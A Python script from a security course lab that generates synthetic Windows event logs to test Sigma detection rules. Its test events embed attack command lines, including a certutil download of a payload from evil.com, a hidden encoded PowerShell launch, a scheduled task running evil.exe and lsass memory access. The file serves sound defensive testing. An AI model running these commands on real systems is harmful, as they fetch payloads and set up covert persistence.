#!/usr/bin/env python3
"""
generate_test_events.py - Genera eventos de prueba para validar reglas Sigma
Curso MAR404 - Clase 9 - Lab 18
"""
import json

events = [
    {"EventID": 10, "SourceImage": "C:\\Users\\admin\\m.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010", "should_match": "mimikatz"},
    {"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc aQBlAHgA", "should_match": "powershell_encoded"},
    {"EventID": 7045, "ServiceName": "UpdateSvc", "ImagePath": "C:\\Windows\\Temp\\svc.exe", "ServiceType": "user mode service", "should_match": "service_temp"},
    {"EventID": 1, "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn Update /tr C:\\Temp\\evil.exe /sc hourly", "should_match": "schtasks"},
    {"EventID": 22, "QueryName": "malware-c2.xyz", "Image": "C:\\Windows\\System32\\svchost.exe", "should_match": "dns_suspicious"},
    {"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\p.exe", "should_match": "certutil_download"},
    # False positives (should NOT match)
    {"EventID": 10, "SourceImage": "C:\\Windows\\System32\\taskmgr.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010", "should_match": "none_fp"},
    {"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe Get-Process", "should_match": "none_fp"},
]

with open("/app/test_events.json", "w") as f:
    json.dump(events, f, indent=2)

print(f"[+] Generated {len(events)} test events in /app/test_events.json")
